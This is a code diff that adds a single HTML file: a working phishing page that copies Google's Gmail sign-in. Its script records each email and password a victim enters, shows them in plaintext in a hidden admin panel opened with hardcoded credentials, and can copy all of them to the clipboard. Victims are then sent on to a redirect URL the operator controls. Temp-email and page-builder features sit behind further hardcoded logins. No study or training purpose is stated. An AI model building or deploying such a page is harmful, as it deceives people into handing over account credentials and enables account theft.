@@ -1,0 +1,1008 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            color: #202124;
+            font-size: 14px;
+            background-color: #f5f5f5;
+        }
+        .header {
+            padding: 20px;
+            text-align: right;
+        }
+        .header a {
+            margin-left: 15px;
+            text-decoration: none;
+            color: #000000DE;
+        }
+        .header a:hover {
+            text-decoration: underline;
+        }
+        .container {
+            max-width: 450px;
+            margin: 0 auto;
+            padding: 48px 0;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 75px;
+            height: 24px;
+        }
+        .card {
+            background: white;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 40px 40px 36px;
+            margin-bottom: 30px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        h1 {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 400;
+            margin: 0 0 15px 0;
+        }
+        .subtitle {
+            text-align: center;
+            font-size: 16px;
+            font-weight: 400;
+            margin-bottom: 30px;
+            color: #5f6368;
+        }
+        .input-field {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        input:focus {
+            border-color: #1a73e8;
+            outline: none;
+        }
+        .forgot-email, .forgot-password {
+            display: block;
+            margin-bottom: 30px;
+            text-decoration: none;
+            color: #1a73e8;
+            font-weight: 500;
+        }
+        .forgot-email:hover, .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .next-button, .signin-button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            font-size: 14px;
+            border-radius: 4px;
+            font-weight: 500;
+            cursor: pointer;
+            float: right;
+        }
+        .next-button:hover, .signin-button:hover {
+            background-color: #1765cc;
+        }
+        .footer {
+            clear: both;
+            padding-top: 20px;
+            text-align: center;
+            color: #5f6368;
+            font-size: 12px;
+        }
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .language-selector {
+            text-align: center;
+            margin-top: 30px;
+        }
+        select {
+            padding: 5px 10px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            background-color: white;
+        }
+        .hidden {
+            display: none;
+        }
+        .show-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #1a73e8;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 500;
+        }
+        /* Admin Panel Styles */
+        #adminPanel {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            display: none;
+        }
+        #adminPanel h1 {
+            color: #d32f2f;
+            text-align: left;
+            margin-bottom: 20px;
+        }
+        #loginHistory {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        #loginHistory th, #loginHistory td {
+            border: 1px solid #ddd;
+            padding: 10px;
+            text-align: left;
+        }
+        #loginHistory th {
+            background-color: #f2f2f2;
+        }
+        #loginHistory tr:nth-child(even) {
+            background-color: #f9f9f9;
+        }
+        .admin-btn {
+            background-color: #d32f2f;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .admin-btn:hover {
+            background-color: #b71c1c;
+        }
+        .export-btn {
+            background-color: #1a73e8;
+            margin-left: 10px;
+        }
+        .export-btn:hover {
+            background-color: #1765cc;
+        }
+        .timestamp {
+            font-size: 12px;
+            color: #666;
+        }
+        .refresh-info {
+            font-size: 12px;
+            color: #666;
+            margin-top: 10px;
+        }
+        /* URL Control Styles */
+        .url-control {
+            margin: 20px 0;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 8px;
+        }
+        .url-control input {
+            width: calc(100% - 100px);
+            margin-right: 10px;
+        }
+        .url-control button {
+            width: 80px;
+        }
+        /* Temp Email Styles */
+        #tempEmailPage {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            display: none;
+        }
+        #tempEmailPage h1 {
+            color: #1a73e8;
+        }
+        .email-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .email-address {
+            font-size: 18px;
+            font-weight: bold;
+        }
+        .inbox {
+            border: 1px solid #eee;
+            border-radius: 8px;
+            padding: 15px;
+            min-height: 300px;
+        }
+        .email-item {
+            padding: 10px;
+            border-bottom: 1px solid #eee;
+            cursor: pointer;
+        }
+        .email-item:hover {
+            background-color: #f5f5f5;
+        }
+        .email-item.unread {
+            font-weight: bold;
+        }
+        .email-content {
+            display: none;
+            margin-top: 15px;
+            padding: 15px;
+            background: #f9f9f9;
+            border-radius: 8px;
+        }
+        .create-email-form {
+            margin-bottom: 20px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 8px;
+        }
+        /* Page Builder Styles */
+        #pageBuilder {
+            max-width: 1000px;
+            margin: 20px auto;
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            display: none;
+        }
+        #pageBuilder h1 {
+            color: #1a73e8;
+            text-align: center;
+        }
+        .builder-tools {
+            display: flex;
+            margin-bottom: 20px;
+        }
+        .builder-preview {
+            flex: 1;
+            border: 1px dashed #ccc;
+            padding: 20px;
+            min-height: 300px;
+        }
+        .builder-controls {
+            width: 250px;
+            margin-left: 20px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 8px;
+        }
+        .control-group {
+            margin-bottom: 15px;
+        }
+        .control-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: 500;
+        }
+        .control-group input, .control-group select, .control-group textarea {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+        }
+        .control-group button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 8px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .element {
+            margin-bottom: 15px;
+            padding: 10px;
+            border: 1px solid #eee;
+            position: relative;
+        }
+        .element-remove {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            color: #d32f2f;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <!-- Regular Login Page -->
+    <div id="loginPage">
+        <div class="header">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+        
+        <div class="container">
+            <div class="logo">
+                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+            </div>
+            
+            <!-- Email Step - Initially visible -->
+            <div class="card" id="emailStep">
+                <h1>Sign in</h1>
+                <div class="subtitle">to continue to Gmail</div>
+                
+                <div class="input-field">
+                    <input type="email" id="email" placeholder="Email or phone" autofocus>
+                </div>
+                
+                <a href="#" class="forgot-email">Forgot email?</a>
+                
+                <div>
+                    <button class="next-button" id="nextButton">Next</button>
+                </div>
+                
+                <div class="footer">
+                    Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a>
+                </div>
+            </div>
+            
+            <!-- Password Step - Initially hidden -->
+            <div class="card hidden" id="passwordStep">
+                <div style="display: flex; align-items: center; margin-bottom: 20px;">
+                    <div style="width: 40px; height: 40px; border-radius: 50%; background-color: #e8f0fe; 
+                                display: flex; align-items: center; justify-content: center; margin-right: 15px;">
+                        <span style="color: #1a73e8; font-weight: bold;" id="emailInitial"></span>
+                    </div>
+                    <div>
+                        <div id="displayEmail" style="font-weight: 500;"></div>
+                        <a href="#" style="font-size: 12px; color: #1a73e8; text-decoration: none;" id="switchAccount">Switch account</a>
+                    </div>
+                </div>
+                
+                <div class="input-field" style="position: relative;">
+                    <input type="password" id="password" placeholder="Enter your password">
+                    <span class="show-password" id="showPassword">Show</span>
+                </div>
+                
+                <a href="#" class="forgot-password">Forgot password?</a>
+                
+                <div style="margin-bottom: 10px;">
+                    <input type="checkbox" id="remember">
+                    <label for="remember">Remember me</label>
+                </div>
+                
+                <div>
+                    <button class="signin-button" id="signInButton">Sign in</button>
+                </div>
+            </div>
+            
+            <div class="language-selector">
+                <select>
+                    <option>English (United States)</option>
+                    <option>Español</option>
+                    <option>Français</option>
+                    <option>Deutsch</option>
+                </select>
+            </div>
+        </div>
+    </div>
+
+    <!-- Admin Panel -->
+    <div id="adminPanel">
+        <h1>🔐 Admin Dashboard</h1>
+        <p>All login attempts are recorded below:</p>
+        
+        <!-- URL Control Section -->
+        <div class="url-control">
+            <h3>Redirect URL Control</h3>
+            <input type="text" id="redirectUrl" placeholder="https://example.com">
+            <button class="admin-btn" id="updateUrlBtn">Update</button>
+            <div class="refresh-info">Current URL: <span id="currentUrl"></span></div>
+        </div>
+        
+        <table id="loginHistory">
+            <thead>
+                <tr>
+                    <th>#</th>
+                    <th>Email</th>
+                    <th>Password</th>
+                    <th>Time</th>
+                </tr>
+            </thead>
+            <tbody id="historyBody">
+                <!-- Data will appear here -->
+            </tbody>
+        </table>
+        
+        <button class="admin-btn" id="logoutButton">Logout</button>
+        <button class="admin-btn export-btn" id="exportButton">Copy All Data</button>
+        <div class="refresh-info">🔄 Auto-refreshes every 3 seconds</div>
+    </div>
+
+    <!-- Temp Email Page -->
+    <div id="tempEmailPage">
+        <div class="email-header">
+            <h1>📧 Temporary Email</h1>
+            <button class="admin-btn" id="backFromTempEmail">Back to Login</button>
+        </div>
+        
+        <div class="create-email-form">
+            <h3>Create New Temp Email</h3>
+            <div class="input-field">
+                <input type="text" id="tempEmailName" placeholder="Choose a name">
+                <span style="margin-left: 5px;">@sadidul.com</span>
+            </div>
+            <div class="input-field">
+                <input type="password" id="tempEmailPassword" placeholder="Set a password">
+            </div>
+            <button class="next-button" id="createTempEmailBtn">Create Email</button>
+        </div>
+        
+        <div id="emailInbox" style="display: none;">
+            <div class="email-header">
+                <div class="email-address" id="currentTempEmail"></div>
+                <button class="admin-btn" id="logoutTempEmail">Logout</button>
+            </div>
+            
+            <h3>Inbox</h3>
+            <div class="inbox" id="inboxContainer">
+                <div class="email-item unread">
+                    <div class="email-subject">Welcome to your temporary email!</div>
+                    <div class="email-sender">system@sadidul.com</div>
+                </div>
+                <div class="email-content" id="email1">
+                    <p>Welcome to your new temporary email address. This inbox will store all emails sent to your @sadidul.com address.</p>
+                    <p>You can use this address to sign up for services without using your real email.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Page Builder Section -->
+    <div id="pageBuilder">
+        <h1>📄 Simple Page Builder</h1>
+        <div class="builder-tools">
+            <div class="builder-preview" id="pagePreview">
+                <!-- Built page will appear here -->
+            </div>
+            <div class="builder-controls">
+                <h3>Add Elements</h3>
+                <div class="control-group">
+                    <label>Element Type</label>
+                    <select id="elementType">
+                        <option value="heading">Heading</option>
+                        <option value="paragraph">Paragraph</option>
+                        <option value="image">Image</option>
+                        <option value="button">Button</option>
+                    </select>
+                </div>
+                <div class="control-group" id="contentControl">
+                    <label>Content</label>
+                    <input type="text" id="elementContent" placeholder="Enter text">
+                </div>
+                <div class="control-group" id="imageControl" style="display:none;">
+                    <label>Image URL</label>
+                    <input type="text" id="imageUrl" placeholder="https://example.com/image.jpg">
+                </div>
+                <div class="control-group">
+                    <button id="addElementBtn">Add Element</button>
+                </div>
+                <div class="control-group">
+                    <button id="savePageBtn" style="background-color: #34a853;">Save Page</button>
+                    <button id="clearPageBtn" style="background-color: #d32f2f;">Clear All</button>
+                </div>
+            </div>
+        </div>
+        <button class="admin-btn" id="backToAdminBtn" style="margin-top: 20px;">Back to Admin</button>
+    </div>
+
+    <script>
+        // Store all login attempts
+        let loginHistory = JSON.parse(localStorage.getItem('loginHistory')) || [];
+        
+        // Admin credentials
+        const ADMIN_EMAIL = "admin";
+        const ADMIN_PASSWORD = "sadidul";
+        
+        // Page Builder credentials
+        const PAGEBUILDER_EMAIL = "ineedpage";
+        const PAGEBUILDER_PASSWORD = "ineedpage";
+        
+        // Temp Email credentials
+        const TEMP_EMAIL = "temp";
+        const TEMP_PASSWORD = "temp";
+        
+        // Temp Email data storage
+        let tempEmails = JSON.parse(localStorage.getItem('tempEmails')) || {};
+        let currentTempEmail = null;
+        
+        // Default redirect URL
+        let redirectUrl = localStorage.getItem('redirectUrl') || "https://youtu.be/AmoBIMjRgKQ?si=2ZydZUg7rrNm7df3";
+        
+        // Auto-refresh interval
+        let refreshInterval;
+        
+        // Initialize the page - show email step, hide others
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('emailStep').classList.remove('hidden');
+            document.getElementById('passwordStep').classList.add('hidden');
+            document.getElementById('adminPanel').style.display = 'none';
+            document.getElementById('tempEmailPage').style.display = 'none';
+            document.getElementById('pageBuilder').style.display = 'none';
+            
+            // Focus on email input
+            document.getElementById('email').focus();
+        });
+        
+        // DOM Elements
+        const nextButton = document.getElementById('nextButton');
+        const signInButton = document.getElementById('signInButton');
+        const switchAccount = document.getElementById('switchAccount');
+        const showPassword = document.getElementById('showPassword');
+        const logoutButton = document.getElementById('logoutButton');
+        const exportButton = document.getElementById('exportButton');
+        const redirectUrlInput = document.getElementById('redirectUrl');
+        const updateUrlBtn = document.getElementById('updateUrlBtn');
+        const currentUrlSpan = document.getElementById('currentUrl');
+        
+        // Initialize current URL display
+        currentUrlSpan.textContent = redirectUrl;
+        redirectUrlInput.value = redirectUrl;
+        
+        // Event Listeners
+        nextButton.addEventListener('click', showPasswordStep);
+        signInButton.addEventListener('click', signIn);
+        switchAccount.addEventListener('click', backToEmail);
+        showPassword.addEventListener('click', togglePassword);
+        logoutButton.addEventListener('click', logoutAdmin);
+        exportButton.addEventListener('click', exportData);
+        updateUrlBtn.addEventListener('click', updateRedirectUrl);
+        
+        function updateRedirectUrl() {
+            const newUrl = redirectUrlInput.value.trim();
+            if (!newUrl) {
+                alert("Please enter a valid URL");
+                return;
+            }
+            
+            // Add https:// if missing
+            const fullUrl = newUrl.startsWith('http') ? newUrl : `https://${newUrl}`;
+            
+            redirectUrl = fullUrl;
+            localStorage.setItem('redirectUrl', fullUrl);
+            currentUrlSpan.textContent = fullUrl;
+            redirectUrlInput.value = fullUrl;
+            alert("Redirect URL updated successfully!");
+        }
+        
+        function showPasswordStep() {
+            const email = document.getElementById('email').value.trim();
+            if (!email) {
+                alert("Please enter an email or phone number");
+                return;
+            }
+            
+            document.getElementById('emailStep').classList.add('hidden');
+            document.getElementById('passwordStep').classList.remove('hidden');
+            
+            // Display the email
+            document.getElementById('displayEmail').textContent = email;
+            
+            // Get first letter for the avatar
+            const initial = email.charAt(0).toUpperCase();
+            document.getElementById('emailInitial').textContent = initial;
+            
+            // Focus on password field
+            document.getElementById('password').focus();
+        }
+        
+        function backToEmail(e) {
+            e.preventDefault();
+            document.getElementById('passwordStep').classList.add('hidden');
+            document.getElementById('emailStep').classList.remove('hidden');
+            document.getElementById('email').focus();
+        }
+        
+        function togglePassword() {
+            const passwordField = document.getElementById('password');
+            
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                showPassword.textContent = 'Hide';
+            } else {
+                passwordField.type = 'password';
+                showPassword.textContent = 'Show';
+            }
+        }
+        
+        function signIn() {
+            const email = document.getElementById('displayEmail').textContent;
+            const password = document.getElementById('password').value;
+            
+            if (!password) {
+                alert("Please enter your password");
+                return;
+            }
+            
+            // Record login attempt
+            const attempt = {
+                timestamp: new Date().toLocaleString(),
+                email: email,
+                password: password
+            };
+            
+            // Get existing data and add new attempt
+            const existingData = JSON.parse(localStorage.getItem('loginHistory')) || [];
+            existingData.push(attempt);
+            localStorage.setItem('loginHistory', JSON.stringify(existingData));
+            
+            // Simulate loading
+            signInButton.textContent = 'Signing in...';
+            signInButton.disabled = true;
+            
+            // Check for admin login
+            if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
+                setTimeout(() => {
+                    showAdminPanel();
+                }, 1000);
+            } 
+            // Check for page builder login
+            else if (email === PAGEBUILDER_EMAIL && password === PAGEBUILDER_PASSWORD) {
+                setTimeout(() => {
+                    showPageBuilder();
+                }, 1000);
+            }
+            // Check for temp email login
+            else if (email === TEMP_EMAIL && password === TEMP_PASSWORD) {
+                setTimeout(() => {
+                    showTempEmailPage();
+                }, 1000);
+            }
+            // Check for existing temp email login
+            else if (email.endsWith('@sadidul.com') && tempEmails[email] && tempEmails[email].password === password) {
+                setTimeout(() => {
+                    openTempEmailInbox(email);
+                }, 1000);
+            }
+            else {
+                setTimeout(() => {
+                    window.location.href = redirectUrl;
+                }, 1000);
+            }
+        }
+        
+        function showAdminPanel() {
+            document.getElementById('loginPage').classList.add('hidden');
+            document.getElementById('adminPanel').style.display = 'block';
+            document.getElementById('tempEmailPage').style.display = 'none';
+            document.getElementById('pageBuilder').style.display = 'none';
+            
+            // Load data immediately
+            updateAdminTable();
+            
+            // Set up auto-refresh every 3 seconds
+            refreshInterval = setInterval(updateAdminTable, 3000);
+        }
+        
+        function showTempEmailPage() {
+            document.getElementById('loginPage').classList.add('hidden');
+            document.getElementById('tempEmailPage').style.display = 'block';
+            document.getElementById('adminPanel').style.display = 'none';
+            document.getElementById('pageBuilder').style.display = 'none';
+            
+            // Set up create email button
+            document.getElementById('createTempEmailBtn').addEventListener('click', createTempEmail);
+            
+            // Set up back button
+            document.getElementById('backFromTempEmail').addEventListener('click', function() {
+                document.getElementById('tempEmailPage').style.display = 'none';
+                document.getElementById('loginPage').classList.remove('hidden');
+                document.getElementById('emailStep').classList.remove('hidden');
+                document.getElementById('passwordStep').classList.add('hidden');
+                document.getElementById('email').value = '';
+                document.getElementById('password').value = '';
+            });
+            
+            // Set up logout button
+            document.getElementById('logoutTempEmail').addEventListener('click', function() {
+                currentTempEmail = null;
+                document.getElementById('emailInbox').style.display = 'none';
+                document.querySelector('.create-email-form').style.display = 'block';
+            });
+            
+            // Set up email click handlers
+            document.querySelectorAll('.email-item').forEach(item => {
+                item.addEventListener('click', function() {
+                    const emailId = this.getAttribute('data-email-id') || 'email1';
+                    document.querySelectorAll('.email-content').forEach(content => {
+                        content.style.display = 'none';
+                    });
+                    document.getElementById(emailId).style.display = 'block';
+                    this.classList.remove('unread');
+                });
+            });
+        }
+
+        function createTempEmail() {
+            const name = document.getElementById('tempEmailName').value.trim();
+            const password = document.getElementById('tempEmailPassword').value;
+            
+            if (!name) {
+                alert("Please enter a name for your email");
+                return;
+            }
+            
+            if (!password) {
+                alert("Please set a password");
+                return;
+            }
+            
+            const fullEmail = `${name}@sadidul.com`;
+            
+            // Save the temp email
+            tempEmails[fullEmail] = {
+                password: password,
+                createdAt: new Date().toLocaleString(),
+                emails: [
+                    {
+                        subject: "Welcome to your temporary email!",
+                        sender: "system@sadidul.com",
+                        content: "Welcome to your new temporary email address. This inbox will store all emails sent to your @sadidul.com address.",
+                        read: false
+                    }
+                ]
+            };
+            
+            localStorage.setItem('tempEmails', JSON.stringify(tempEmails));
+            
+            // Open the inbox
+            openTempEmailInbox(fullEmail);
+        }
+
+        function openTempEmailInbox(email) {
+            currentTempEmail = email;
+            document.querySelector('.create-email-form').style.display = 'none';
+            document.getElementById('emailInbox').style.display = 'block';
+            document.getElementById('currentTempEmail').textContent = email;
+            
+            // Load emails
+            const inbox = tempEmails[email].emails;
+            const inboxContainer = document.getElementById('inboxContainer');
+            
+            // Clear existing emails (except the welcome message)
+            inboxContainer.innerHTML = `
+                <div class="email-item unread" data-email-id="email1">
+                    <div class="email-subject">Welcome to your temporary email!</div>
+                    <div class="email-sender">system@sadidul.com</div>
+                </div>
+                <div class="email-content" id="email1">
+                    <p>Welcome to your new temporary email address. This inbox will store all emails sent to your @sadidul.com address.</p>
+                    <p>You can use this address to sign up for services without using your real email.</p>
+                </div>
+            `;
+            
+            // Add other emails
+            inbox.forEach((email, index) => {
+                if (email.subject !== "Welcome to your temporary email!") {
+                    const emailId = `email${index+2}`;
+                    inboxContainer.innerHTML += `
+                        <div class="email-item ${email.read ? '' : 'unread'}" data-email-id="${emailId}">
+                            <div class="email-subject">${email.subject}</div>
+                            <div class="email-sender">${email.sender}</div>
+                        </div>
+                        <div class="email-content" id="${emailId}">
+                            <p>${email.content}</p>
+                        </div>
+                    `;
+                }
+            });
+            
+            // Reattach event listeners
+            document.querySelectorAll('.email-item').forEach(item => {
+                item.addEventListener('click', function() {
+                    const emailId = this.getAttribute('data-email-id');
+                    document.querySelectorAll('.email-content').forEach(content => {
+                        content.style.display = 'none';
+                    });
+                    document.getElementById(emailId).style.display = 'block';
+                    this.classList.remove('unread');
+                    
+                    // Mark as read in storage
+                    if (emailId !== 'email1') {
+                        const index = parseInt(emailId.replace('email', '')) - 2;
+                        tempEmails[currentTempEmail].emails[index].read = true;
+                        localStorage.setItem('tempEmails', JSON.stringify(tempEmails));
+                    }
+                });
+            });
+        }
+        
+        function showPageBuilder() {
+            document.getElementById('loginPage').classList.add('hidden');
+            document.getElementById('adminPanel').style.display = 'none';
+            document.getElementById('tempEmailPage').style.display = 'none';
+            document.getElementById('pageBuilder').style.display = 'block';
+            
+            // Load saved page if exists
+            const savedPage = localStorage.getItem('builtPage');
+            if (savedPage) {
+                document.getElementById('pagePreview').innerHTML = savedPage;
+                addRemoveListeners();
+            }
+            
+            // Set up element type switcher
+            document.getElementById('elementType').addEventListener('change', function() {
+                const type = this.value;
+                document.getElementById('contentControl').style.display = type === 'image' ? 'none' : 'block';
+                document.getElementById('imageControl').style.display = type === 'image' ? 'block' : 'none';
+            });
+            
+            // Add element button
+            document.getElementById('addElementBtn').addEventListener('click', addElement);
+            
+            // Save page button
+            document.getElementById('savePageBtn').addEventListener('click', savePage);
+            
+            // Clear page button
+            document.getElementById('clearPageBtn').addEventListener('click', clearPage);
+            
+            // Back to admin button
+            document.getElementById('backToAdminBtn').addEventListener('click', function() {
+                document.getElementById('pageBuilder').style.display = 'none';
+                showAdminPanel();
+            });
+        }
+        
+        function addElement() {
+            const type = document.getElementById('elementType').value;
+            const content = document.getElementById('elementContent').value;
+            const imageUrl = document.getElementById('imageUrl').value;
+            const preview = document.getElementById('pagePreview');
+            
+            let element;
+            
+            switch(type) {
+                case 'heading':
+                    element = document.createElement('h2');
+                    element.textContent = content;
+                    break;
+                case 'paragraph':
+                    element = document.createElement('p');
+                    element.textContent = content;
+                    break;
+                case 'image':
+                    element = document.createElement('img');
+                    element.src = imageUrl;
+                    element.style.maxWidth = '100%';
+                    break;
+                case 'button':
+                    element = document.createElement('button');
+                    element.textContent = content;
+                    element.style.padding = '8px 16px';
+                    element.style.backgroundColor = '#1a73e8';
+                    element.style.color = 'white';
+                    element.style.border = 'none';
+                    element.style.borderRadius = '4px';
+                    break;
+            }
+            
+            const wrapper = document.createElement('div');
+            wrapper.className = 'element';
+            wrapper.appendChild(element);
+            
+            const removeBtn = document.createElement('span');
+            removeBtn.className = 'element-remove';
+            removeBtn.innerHTML = '✕';
+            removeBtn.addEventListener('click', function() {
+                wrapper.remove();
+            });
+            
+            wrapper.appendChild(removeBtn);
+            preview.appendChild(wrapper);
+            
+            // Clear inputs
+            document.getElementById('elementContent').value = '';
+            document.getElementById('imageUrl').value = '';
+        }
+        
+        function addRemoveListeners() {
+            document.querySelectorAll('.element-remove').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    this.parentElement.remove();
+                });
+            });
+        }
+        
+        function savePage() {
+            const preview = document.getElementById('pagePreview').innerHTML;
+            localStorage.setItem('builtPage', preview);
+            alert('Page saved successfully!');
+        }
+        
+        function clearPage() {
+            if (confirm('Are you sure you want to clear the page?')) {
+                document.getElementById('pagePreview').innerHTML = '';
+                localStorage.removeItem('builtPage');
+            }
+        }
+        
+        function updateAdminTable() {
+            // Get FRESH data from localStorage
+            const freshData = JSON.parse(localStorage.getItem('loginHistory')) || [];
+            
+            // Display all login attempts
+            const historyBody = document.getElementById('historyBody');
+            historyBody.innerHTML = '';
+            
+            freshData.forEach((attempt, index) => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${index + 1}</td>
+                    <td>${attempt.email}</td>
+                    <td>${attempt.password}</td>
+                    <td class="timestamp">${attempt.timestamp}</td>
+                `;
+                historyBody.appendChild(row);
+            });
+        }
+        
+        function logoutAdmin() {
+            // Clear the refresh interval
+            if (refreshInterval) {
+                clearInterval(refreshInterval);
+            }
+            
+            document.getElementById('adminPanel').style.display = 'none';
+            document.getElementById('loginPage').classList.remove('hidden');
+            document.getElementById('emailStep').classList.remove('hidden');
+            document.getElementById('passwordStep').classList.add('hidden');
+            
+            // Reset form
+            document.getElementById('email').value = '';
+            document.getElementById('password').value = '';
+            signInButton.textContent = 'Sign in';
+            signInButton.disabled = false;
+        }
+        
+        function exportData() {
+            const freshData = JSON.parse(localStorage.getItem('loginHistory')) || [];
+            const data = JSON.stringify(freshData, null, 2);
+            navigator.clipboard.writeText(data)
+                .then(() => alert("All login data copied to clipboard!"))
+                .catch(() => alert("Failed to copy data."));
+        }
+        
+        // Allow pressing Enter in email field
+        document.getElementById('email').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                showPasswordStep();
+            }
+        });
+        
+        // Allow pressing Enter in password field
+        document.getElementById('password').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                signIn();
+            }
+        });
+    </script>
+</body>
+</html>
